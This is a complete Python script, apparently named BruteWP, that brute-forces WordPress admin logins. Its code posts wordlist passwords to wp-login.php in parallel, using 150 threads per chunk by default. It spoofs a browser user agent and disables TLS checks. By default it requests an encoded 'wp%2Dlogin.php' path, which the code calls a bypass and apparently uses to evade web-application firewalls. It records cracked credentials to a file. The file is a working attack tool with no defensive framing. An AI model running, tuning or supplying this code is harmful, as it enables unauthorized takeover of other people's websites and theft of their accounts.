#!/usr/bin/env python3
"""Headless BruteWP: 50k chunks, parallel chunk workers, high thread count."""
from __future__ import annotations

import argparse
import glob
import os
import sys
import threading
import time
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
)

found_lock = threading.Lock()
found_password: str | None = None
stop_flag = False


def login_url(base: str, bypass: bool) -> str:
    base = base.rstrip("/")
    return f"{base}/wp%2Dlogin.php" if bypass else f"{base}/wp-login.php"


def log_msg(log_path: str, msg: str) -> None:
    line = f"[{datetime.now().isoformat()}] {msg}"
    print(line, flush=True)
    with open(log_path, "a") as out:
        out.write(line + "\n")


def test_password(session: requests.Session, url: str, username: str, password: str) -> tuple[bool, str | None]:
    try:
        data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "testcookie": "1",
            "redirect_to": url.rsplit("/", 1)[0] + "/wp-admin/",
        }
        r = session.post(url, data=data, timeout=12, verify=False, allow_redirects=True)
        if r.status_code == 403 or "could not be satisfied" in r.text.lower():
            return False, None
        cookies = session.cookies.get_dict()
        if any("wordpress_logged_in" in k for k in cookies):
            return True, password
        if r.status_code == 302 and "wp-admin" in (r.headers.get("Location") or ""):
            return True, password
    except Exception:
        pass
    return False, None


def run_chunk(
    url: str,
    username: str,
    passwords: list[str],
    threads: int,
    chunk_label: str,
    log_path: str,
) -> str | None:
    """Brute one 50k chunk; returns password if found."""
    global stop_flag

    if stop_flag or not passwords:
        return None

    tested = 0
    start = time.time()
    waf_hits = 0

    def worker(pwd: str) -> str | None:
        nonlocal waf_hits
        if stop_flag:
            return None
        s = requests.Session()
        s.headers.update({"User-Agent": UA})
        try:
            s.get(url, timeout=12, verify=False)
            ok, found = test_password(s, url, username, pwd)
            if not ok and found is None:
                pass
            if ok and found:
                return found
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {pool.submit(worker, p): p for p in passwords}
        for fut in as_completed(futures):
            if stop_flag:
                pool.shutdown(wait=False, cancel_futures=True)
                break
            tested += 1
            hit = fut.result()
            if hit:
                return hit
            if tested % 10000 == 0:
                elapsed = time.time() - start
                rate = tested / elapsed if elapsed else 0
                log_msg(log_path, f"  {chunk_label} progress {tested}/{len(passwords)} ({rate:.0f}/s)")

    elapsed = time.time() - start
    rate = tested / elapsed if elapsed else 0
    log_msg(log_path, f"  {chunk_label} done {tested} pwds in {elapsed:.0f}s ({rate:.0f}/s)")
    return None


def load_passwords(path: str) -> list[str]:
    with open(path, encoding="latin-1", errors="ignore") as f:
        return [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]


def run_attack(
    base: str,
    username: str,
    wordlist: str,
    threads: int,
    bypass: bool,
    log_path: str,
    chunk_size: int,
    parallel_chunks: int,
) -> int:
    global found_password, stop_flag
    found_password = None
    stop_flag = False

    url = login_url(base, bypass)
    wl_path = Path(wordlist)

    if wl_path.is_dir():
        chunk_files = sorted(glob.glob(str(wl_path / "chunk_*.txt")))
        if not chunk_files:
            raise SystemExit(f"No chunk_*.txt in {wordlist}")
    else:
        chunk_files = [str(wl_path)]

    log_msg(
        log_path,
        f"START user={username} target={url} chunks={len(chunk_files)} "
        f"threads/chunk={threads} parallel_chunks={parallel_chunks}",
    )

    def process_one_chunk(chunk_file: str) -> str | None:
        global stop_flag, found_password
        if stop_flag:
            return None
        label = Path(chunk_file).name
        passwords = load_passwords(chunk_file)
        log_msg(log_path, f"CHUNK {label} ({len(passwords)} passwords)")
        hit = run_chunk(url, username, passwords, threads, label, log_path)
        if hit:
            with found_lock:
                found_password = hit
                stop_flag = True
            log_msg(log_path, f"FOUND {username}:{hit} in {label}")
            with open("found_credentials.txt", "a") as out:
                out.write(f"{datetime.now().isoformat()} {base} {username}:{hit} chunk={label}\n")
            return hit
        return None

    # Process chunks with parallel chunk workers (each chunk uses full thread pool)
    with ThreadPoolExecutor(max_workers=parallel_chunks) as chunk_pool:
        futures = {chunk_pool.submit(process_one_chunk, cf): cf for cf in chunk_files}
        for fut in as_completed(futures):
            if stop_flag:
                chunk_pool.shutdown(wait=False, cancel_futures=True)
                break
            hit = fut.result()
            if hit:
                return 0

    log_msg(log_path, f"DONE user={username} no_password")
    return 1


def main() -> int:
    p = argparse.ArgumentParser(description="BruteWP chunked + parallel")
    p.add_argument("-u", "--url")
    p.add_argument("-U", "--username")
    p.add_argument("-w", "--wordlist", help="File or dir of chunk_*.txt")
    p.add_argument("-t", "--threads", type=int, default=150, help="Threads per chunk")
    p.add_argument("-p", "--parallel-chunks", type=int, default=4, help="Chunks at once")
    p.add_argument("--chunk-size", type=int, default=50000, help="For splitter only")
    p.add_argument("--split", metavar="BIGLIST", help="Split file into 50k chunks in -w dir")
    p.add_argument("--no-bypass", action="store_true")
    p.add_argument("-l", "--log", default="/root/BruteWP/brute_run.log")
    args = p.parse_args()

    if args.split:
        out_dir = Path(args.wordlist)
        out_dir.mkdir(parents=True, exist_ok=True)
        chunk_size = args.chunk_size
        idx = 0
        buf: list[str] = []
        total = 0
        with open(args.split, encoding="latin-1", errors="ignore") as f:
            for line in f:
                s = line.strip()
                if not s or s.startswith("#"):
                    continue
                buf.append(s)
                if len(buf) >= chunk_size:
                    path = out_dir / f"chunk_{idx:04d}.txt"
                    path.write_text("\n".join(buf) + "\n")
                    total += len(buf)
                    idx += 1
                    buf = []
                    if idx % 10 == 0:
                        print(f"  split {idx} chunks ({total} lines)...", flush=True)
        if buf:
            path = out_dir / f"chunk_{idx:04d}.txt"
            path.write_text("\n".join(buf) + "\n")
            total += len(buf)
            idx += 1
        print(f"[+] {idx} chunks, {total} passwords -> {out_dir}")
        return 0

    if not args.url or not args.username or not args.wordlist:
        p.error("-u, -U, and -w are required unless using --split")

    return run_attack(
        args.url,
        args.username,
        args.wordlist,
        args.threads,
        not args.no_bypass,
        args.log,
        args.chunk_size,
        args.parallel_chunks,
    )


if __name__ == "__main__":
    sys.exit(main())
